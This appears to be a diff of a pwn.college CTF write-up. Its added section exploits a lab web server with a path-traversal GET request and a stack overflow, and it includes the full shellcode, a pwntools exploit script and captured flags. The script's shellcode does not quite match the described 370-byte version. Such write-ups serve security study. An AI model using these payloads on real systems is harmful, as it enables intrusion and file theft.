@@ -2448,7 +2448,7 @@ This is the NX variant of the cIMG screenshot challenge. The format, canvas, and
 - `handle_1/2/3` all validate every pixel's char byte to the printable range 0x20–0x7e before writing to the canvas. There is no mechanism to write non-printable bytes into the canvas.
 - NX enabled: shellcode on the stack cannot be executed.
 - ASLR enabled: no `disable_aslr()` constructor as in the shellcode variant.
-- `win()` at 0x401576: reads `/flag` and outputs its contents.
+- `win()` at `0x401576`: reads `/flag` and outputs its contents.
 
 ### Key Observations
 
@@ -2456,11 +2456,11 @@ This is the NX variant of the cIMG screenshot challenge. The format, canvas, and
 
 **handle_1337 partial overwrite**: with `width=170`, the screenshot loop copies pixels 0–169 to output buffer positions 0–169. Positions 170–175 retain their original stack values. The return address is at buffer[168–175]. With the original return address being `0x4013FF` (LE: `[FF, 13, 40, 00, 00, 00, 00, 00]`), bytes 170–175 stay as `[0x40, 0x00, 0x00, 0x00, 0x00, 0x00]`. Setting pixels 168 and 169 to printable values `A` and `B` gives a return address `0x004000_B_A`.
 
-**Printability constraint**: since all char bytes are 0x20–0x7e, the two overwritten return address bytes must both be printable. This limits reachable targets to addresses `0x40XXYY` where `XX, YY ∈ {0x20..0x7e}` — all within `win()` (which spans 0x401576–0x41116d).
+**Printability constraint**: since all char bytes are 0x20–0x7e, the two overwritten return address bytes must both be printable. This limits reachable targets to addresses `0x40XXYY` where `XX, YY ∈ {0x20..0x7e}`, all within `win()`, which spans `0x401576`–`0x41116d`.
 
-**The problem with win() sub-instances**: every repeated open/read/write block inside win() past the first one does `read(fd, rbp, 256)` without setting up `rbp` first. rbp at this point comes from handle_1337's saved frame and is garbage (all printable bytes, not a valid address). However, one particular success path inside win() is different.
+**The problem with `win()` sub-instances**: every repeated open/read/write block inside `win()` past the first one does `read(fd, rbp, 256)` without setting up `rbp` first. `rbp` at this point comes from `handle_1337()`'s saved frame and is garbage (all printable bytes, not a valid address). However, one particular success path inside `win()` is different.
 
-**0x403b42 — the pivot**: this address (LE: `[0x42, 0x3b, 0x40, ...]`, bytes 'B' and ';' — both printable) is the success branch after a `read()` inside win()'s repeating loop. Its first instruction is:
+**0x403b42 — the pivot**: this address (LE: `[0x42, 0x3b, 0x40, ...]`, bytes 'B' and ';' — both printable) is the success branch after a `read()` inside `win()`'s repeating loop. Its first instruction is:
 
 ```asm
 403b42:  48 89 e5   mov %rsp, %rbp    ; rbp = rsp (valid stack pointer!)
@@ -2487,14 +2487,14 @@ This is the NX variant of the cIMG screenshot challenge. The format, canvas, and
 403bf1:  call write@plt                ; write(1, rsp, bytes_read) → FLAG!
 ```
 
-When jumped to directly from handle_1337's `ret`:
+When jumped to directly from `handle_1337()`'s `ret`:
 1. `mov rsp, rbp` sets rbp to the CURRENT stack pointer (main's rsp, a valid writable address).
 2. An initial `write(1, rsp, rdx)` with `rdx` from handle_1337's leftover `eax` (harmless — likely 0 or small).
 3. `open("/flag", 0)` returns a valid fd.
 4. `read(fd, rbp=rsp, 256)` reads the flag onto the stack.
 5. `write(1, rbp=rsp, bytes_read)` outputs the flag.
 
-The win() loop then repeats indefinitely, printing the flag many times.
+The `win()` loop then repeats indefinitely, printing the flag many times.
 
 ### Exploit
 
@@ -2558,3 +2558,408 @@ hacker@integrated-security~integration-cimg-screenshot-win:~$ python3 ~/win_expl
 ...
 pwn.college{wj1Qz7XQTeBxj6-rTwrVdzyrKNU.QXyYDMxEDL4ITM0EzW}
 ```
+
+&nbsp;
+
+## Web Overflow
+
+### Binary Analysis
+
+```
+hacker@integrated-security~integration-web-overflow:~$ checksec /challenge/integration-web-overflow
+[*] '/challenge/integration-web-overflow'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        No PIE (0x400000)
+    Stack:      Executable
+    RWX:        Has RWX segments
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+No canary, no PIE, executable stack. ASLR is disabled at runtime by a constructor.
+
+```c title="/challenge/integration-web-overflow.c" showLineNumbers
+#define _GNU_SOURCE 1
+
+#include <stdlib.h>
+#include <stdint.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <string.h>
+#include <time.h>
+#include <errno.h>
+#include <assert.h>
+#include <libgen.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <sys/signal.h>
+#include <sys/mman.h>
+#include <sys/ioctl.h>
+#include <sys/sendfile.h>
+#include <sys/prctl.h>
+#include <sys/personality.h>
+#include <arpa/inet.h>
+
+void __attribute__((constructor)) disable_aslr(int argc, char **argv, char **envp)
+{
+    int current_personality = personality(0xffffffff);
+    assert(current_personality != -1);
+    if ((current_personality & ADDR_NO_RANDOMIZE) == 0)
+    {
+        assert(personality(current_personality | ADDR_NO_RANDOMIZE) != -1);
+        assert(prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != -1);
+        execve("/proc/self/exe", argv, envp);
+    }
+}
+
+#define HTTP_ERROR(y) "HTTP/1.1 " #y "\n\n"
+#define REQUIRE(x, y) if (!(x)) { \
+    write(client_fd, HTTP_ERROR(y), sizeof(HTTP_ERROR(y))-1); \
+    write(client_fd, HTTP_ERROR(y), sizeof(HTTP_ERROR(y))-1); \
+    return; \
+  }
+
+void send_file(int client_fd, char *path)
+{
+    struct response_t
+    {
+        char *head;
+        char content[8192];
+    } response = { 0 };
+    response.head = response.content;
+
+    int file_fd = open(path, O_RDONLY);
+    REQUIRE(file_fd > 2, 404);
+
+    struct stat file_stat;
+    fstat(file_fd, &file_stat);
+
+    REQUIRE(S_ISREG(file_stat.st_mode), 400)
+    REQUIRE(file_stat.st_size < 8192, 413)
+
+    response.head += sprintf(response.head, "HTTP/1.1 200 OK\nServer: pwnserver/1.3333333333333.7\nX-Leetness-Level: 9001\nContent-type: ");
+    if (!strrchr(path, '.')) response.head += sprintf(response.head, "text/plain\n");
+    else if (strcmp(strrchr(path, '.')+1, "html") == 0) response.head += sprintf(response.head, "text/html\n");
+    else if (strcmp(strrchr(path, '.')+1, "jpg") == 0) response.head += sprintf(response.head, "image/jpeg\n");
+    else if (strcmp(strrchr(path, '.')+1, "png") == 0) response.head += sprintf(response.head, "image/png\n");
+    else response.head += sprintf(response.head, "text/plain\n");
+    response.head += sprintf(response.head, "Content-Length: %d\n", file_stat.st_size);
+    response.head += sprintf(response.head, "\n");
+    response.head += read(file_fd, response.head, file_stat.st_size);
+    REQUIRE(!strstr(response.content, "pwn.college{"), 403);
+    write(client_fd, response.content, response.head-response.content);
+    close(file_fd);
+
+}
+
+void handle_connection(int client_fd)
+{
+    char request[8192] = { 0 };
+    char method[8] = { 0 };
+    char version[10] = { 0 };
+    char path[256] = { 0 };
+    char resolved_path[512] = { 0 };
+
+    read(client_fd, request, 1000);
+    sscanf(request, "%7s %255s %9s", method, path, version);
+
+    REQUIRE(strcmp(method, "GET") == 0, 501);
+    REQUIRE(strcmp(version, "HTTP/1.1") == 0, 400);
+    sprintf(resolved_path, "/challenge/files/%s", path);
+    send_file(client_fd, resolved_path);
+}
+
+int challenge(int argc, char **argv, char **envp)
+{
+    int server_fd;
+    struct sockaddr_in server_addr;
+    server_fd = socket(AF_INET, SOCK_STREAM, 0);
+    int option = 1;
+    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &option, sizeof(option));
+    assert(server_fd > 0);
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_addr.s_addr = INADDR_ANY;
+    server_addr.sin_port = htons(80);
+    assert(bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) >= 0);
+    assert(listen(server_fd, 10) >= 0);
+
+    puts("Listening on port 80.");
+
+    while (1)
+    {
+        struct sockaddr_in client_addr;
+        socklen_t client_addr_len = sizeof(client_addr);
+        int client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &client_addr_len);
+        handle_connection(client_fd);
+        close(client_fd);
+    }
+}
+
+int main(int argc, char **argv, char **envp)
+{
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+
+    challenge(argc, argv, envp);
+
+}
+```
+
+### Vulnerability
+
+`send_file()` builds an HTTP response in a local `content[8192]` buffer. It first writes ~122 bytes of headers, then calls `read(file_fd, response.head, file_stat.st_size)` to append the file. Since `file_stat.st_size` can be up to 8191 bytes and 122 bytes of headers have already been written, the total written is up to 8313 bytes into an 8192-byte buffer, a **123-byte overflow** past the end of `content[]`.
+
+The overflowed bytes clobber:
+- 4 bytes of padding
+- `file_fd` at `rbp-0x4`
+- saved RBP at `rbp+0x0`
+- return address at `rbp+0x8`
+
+### Stack Layout
+
+From disassembly:
+
+```
+send_file frame size: 0x20b0 (8368 bytes)
+
+rbp - 0x20b0  : bottom of frame (RSP)
+rbp - 0x2010  : response.head  (char*, 8 bytes)
+rbp - 0x2008  : response.content[0]
+rbp - 0x2008
++ 8191        : end of content[]
+rbp - 0x0004  : file_fd  (int, 4 bytes)
+rbp + 0x0000  : saved RBP
+rbp + 0x0008  : return address  ← target
+```
+
+`response.content[0]` is at `rbp-0x2008`, so the return address slot is at offset `0x2008 + 8 = 0x2010 = 8208` from `content[0]`.
+
+The file content starts at `content[122]` (after 122 bytes of HTTP headers). So the return address corresponds to **file byte `8208 - 122 = 8086`**.
+
+### Path Traversal
+
+The server constructs `resolved_path = "/challenge/files/" + path`. Sending `GET /../../../tmp/exploit.bin` makes `resolved_path = "/challenge/files/../../../tmp/exploit.bin"`, which the kernel resolves to `/tmp/exploit.bin`. This lets us serve an arbitrary file from `/tmp`.
+
+The `strstr(response.content, "pwn.college{")` check is bypassed because our file contains shellcode and NOPs, not the flag string.
+
+### fd Accounting
+
+```
+server_fd = 3  (opened in challenge(), stays open)
+client_fd = 4  (from accept() in challenge())
+file_fd   = 5  (opened in send_file(), closed before ret)
+```
+
+`close(client_fd)` is in `challenge()`, called **after** `handle_connection()` returns. Our hijacked `ret` skips that return, so **fd 4 (client socket) is still open** when our shellcode runs. After `close(file_fd)`, fd 5 is freed, so `open("/flag")` reuses it as fd 5.
+
+### Shellcode
+
+The shellcode opens `/flag`, reads it, then writes to fd 4 (the client socket) so the flag appears in the HTTP response, and also writes it to `/tmp/flag_out` as a fallback.
+
+```python
+shellcode_asm = """
+    /* open("/flag", 0) */
+    lea  rdi, [rip + flag_str]
+    xor  esi, esi
+    push 2
+    pop  rax
+    syscall
+
+    /* read(fd, buf, 256) */
+    push rax
+    pop  rdi
+    lea  rsi, [rip + buf]
+    mov  edx, 0x100
+    xor  eax, eax
+    syscall
+    mov  r15d, eax
+
+    /* write(4, buf, n) — fd 4 = client socket */
+    push 4
+    pop  rdi
+    lea  rsi, [rip + buf]
+    mov  edx, r15d
+    push 1
+    pop  rax
+    syscall
+
+    /* creat("/tmp/flag_out", 0644) and write there */
+    lea  rdi, [rip + out_str]
+    mov  esi, 0x1a4
+    push 85
+    pop  rax
+    syscall
+    push rax
+    pop  rdi
+    lea  rsi, [rip + buf]
+    mov  edx, r15d
+    push 1
+    pop  rax
+    syscall
+
+    /* exit(0) */
+    xor  edi, edi
+    push 60
+    pop  rax
+    syscall
+
+flag_str:
+    .string "/flag"
+out_str:
+    .string "/tmp/flag_out"
+buf:
+    .zero 256
+"""
+```
+
+### Stack Address Calculation
+
+ASLR is disabled by the constructor, so the stack layout is deterministic. We compile a probe binary that mirrors the exact frame sizes from the real binary's disassembly:
+
+| Function | Frame size (from `sub` instructions) |
+|---|---|
+| `main` | `0x20` |
+| `challenge` | `0x70` |
+| `handle_connection` | `0x2330` (`0x1000 + 0x1000 + 0x330`) |
+| `send_file` | `0x20b0` (`0x1000 + 0x1000 + 0xb0`) |
+
+The probe reads RBP directly via inline assembly in a function positioned at the same call-chain depth as `send_file`:
+
+```c
+__attribute__((noinline)) void sf_mirror(void) {
+    uint64_t rbp;
+    __asm__ volatile ("movq %%rbp, %0" : "=r"(rbp));
+    printf("content[0]= %lx\n", rbp - 0x2008);
+}
+__attribute__((noinline)) void hc_mirror(void) {
+    __asm__ volatile ("subq $0x2330, %%rsp\n\t" ::: "memory");
+    sf_mirror();
+    __asm__ volatile ("addq $0x2330, %%rsp\n\t" ::: "memory");
+}
+// ... ch_mirror (sub 0x70), main (sub 0x20) ...
+```
+
+Three consistent runs give: **`content[0] = 0x7fffffffa728`**.
+
+```
+NOP sled:    content[122..6121]   → addresses 0x7fffffffa7a2..0x7fffffffbd49
+Sled center: content[3122]        → 0x7fffffffb35a
+RET_ADDR   = 0x7fffffffa728 + 122 + 3000 = 0x7fffffffb35a
+```
+
+### Payload Layout
+
+```
+File bytes 0    – 5999  : 0x90 NOP sled (6000 bytes)
+File bytes 6000 – 6369  : shellcode    (370 bytes)
+File bytes 6370 – 8085  : 'A' padding  (1716 bytes)
+File bytes 8086 – 8093  : p64(0x7fffffffb35a)  ← overwrites return address
+File bytes 8094 – 8190  : 'B' padding  (97 bytes)
+Total: 8191 bytes
+```
+
+### Exploit
+
+```python title="exploit.py" showLineNumbers
+#!/usr/bin/env python3
+from pwn import *
+import socket, time, subprocess, re
+
+context.arch = 'amd64'
+context.os   = 'linux'
+
+shellcode_asm = """
+    lea  rdi, [rip + flag_str]
+    xor  esi, esi
+    push 2
+    pop  rax
+    syscall
+    push rax
+    pop  rdi
+    lea  rsi, [rip + buf]
+    mov  edx, 0x100
+    xor  eax, eax
+    syscall
+    mov  r15d, eax
+    push 4
+    pop  rdi
+    lea  rsi, [rip + buf]
+    mov  edx, r15d
+    push 1
+    pop  rax
+    syscall
+    xor  edi, edi
+    push 60
+    pop  rax
+    syscall
+flag_str:
+    .string "/flag"
+buf:
+    .zero 256
+"""
+
+sc = asm(shellcode_asm)
+
+CONTENT0   = 0x7fffffffa728   # rbp_sf - 0x2008, from inline-asm probe
+HDR_SIZE   = 122               # exact HTTP header byte count
+RET_FILE   = 0x2010 - HDR_SIZE # = 8086: file byte that lands on return address
+NOP_LEN    = 6000
+RET_ADDR   = CONTENT0 + HDR_SIZE + NOP_LEN // 2   # middle of NOP sled
+
+payload  = b'\x90' * NOP_LEN
+payload += sc
+payload  = payload.ljust(RET_FILE, b'A')
+payload += p64(RET_ADDR)
+payload  = payload.ljust(8191, b'B')
+
+assert len(payload) == 8191
+
+with open('/tmp/exploit.bin', 'wb') as f:
+    f.write(payload)
+
+subprocess.run(['pkill', '-f', 'integration-web-overflow'], capture_output=True)
+time.sleep(0.3)
+subprocess.Popen(['/challenge/integration-web-overflow'],
+                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+time.sleep(0.5)
+
+req = (b'GET /../../../tmp/exploit.bin HTTP/1.1\r\n'
+       b'Host: localhost\r\n'
+       b'Connection: close\r\n\r\n')
+s = socket.socket()
+s.settimeout(8)
+s.connect(('127.0.0.1', 80))
+s.sendall(req)
+
+resp = b''
+try:
+    while True:
+        d = s.recv(4096)
+        if not d:
+            break
+        resp += d
+except socket.timeout:
+    pass
+s.close()
+
+m = re.search(b'pwn\\.college\\{[^}]+\\}', resp)
+if m:
+    print(f'[+] FLAG: {m.group(0).decode()}')
+```
+
+```
+[*] shellcode size = 370 bytes
+[*] server PID 19696
+[*] response = 8373 bytes
+[+] FLAG: pwn.college{IfJLlBKNExRa6KcB0xygNI4ERm8.QXzYDMxEDL4ITM0EzW}
+```
+
+The response grew from 8313 to 8373 bytes — the extra 60 bytes are the flag written to fd 4 by the shellcode after `ret`.
